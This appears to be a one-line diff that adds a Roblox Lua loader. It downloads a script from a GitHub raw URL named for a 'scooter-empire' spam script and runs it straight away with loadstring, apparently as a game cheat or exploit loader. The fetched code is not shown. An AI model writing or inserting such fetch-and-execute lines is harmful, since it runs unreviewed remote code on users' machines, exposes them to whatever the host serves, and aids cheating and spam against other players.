@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/scooter-empire-spam5-n37qhk0qobp6j5.lua"))()
